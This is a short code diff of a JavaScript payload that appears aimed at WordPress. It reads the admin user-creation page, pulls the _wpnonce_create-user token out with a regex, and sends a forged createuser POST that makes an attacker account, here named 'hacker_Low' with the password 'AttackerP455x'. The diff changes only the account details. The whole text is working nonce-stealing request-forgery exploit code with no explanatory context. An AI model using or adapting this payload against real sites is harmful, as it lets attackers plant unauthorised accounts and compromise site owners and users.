@@ -10,7 +10,7 @@ req_admin.open("GET", url, false);
 req_admin.send();
 var nonce = regex.exec(req_admin.responseText);
 var nonce = nonce[1];
-var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=hacker&email=cccl@gmail.com&pass1=AttackerP455&pass2=AttackerP455&role=subscriber";
+var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=hacker_Low&email=cccl_low@gmail.com&pass1=AttackerP455x&pass2=AttackerP455x&role=subscriber";
 req_admin.open("POST", url, true);
 req_admin.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 req_admin.send(params);
